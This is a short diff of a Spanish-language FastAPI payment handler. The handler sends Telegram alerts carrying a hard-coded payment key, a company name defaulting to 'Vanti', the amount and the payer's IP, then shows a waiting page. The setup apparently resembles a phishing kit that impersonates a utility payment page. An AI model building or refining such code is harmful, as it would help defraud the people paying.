@@ -204,16 +204,17 @@ async def procesar_pago_llave(
         enviar_mensaje_telegram(
             f"🔑 <b>¡Nuevo pago con Llave BRE-B!</b>\n"
             f"• <b>Llave usada:</b> <code>0093310444</code>\n"
-            f"• <b>Empresa:</b> {tx['empresa']}\n"
+            f"• <b>Empresa:</b> {tx.get('empresa', 'Vanti')}\n"
             f"• <b>Referencia:</b> {referencia}\n"
             f"• <b>Monto:</b> ${monto:,.0f}\n"
             f"• <b>IP:</b> {ip}"
         )
 
+    # CORRECCIÓN AQUÍ: Sintaxis correcta de Jinja2 en FastAPI
     return templates.TemplateResponse(
-    "esperando.html", 
-    {"request": request, "tx_id": tx_id}
-)
+        "esperando.html", 
+        {"request": request, "tx_id": tx_id}
+    )
 
 @app.post("/notificar_pago", response_class=HTMLResponse)
 async def notificar_pago(request: Request, tx_id: int = Form(...)):
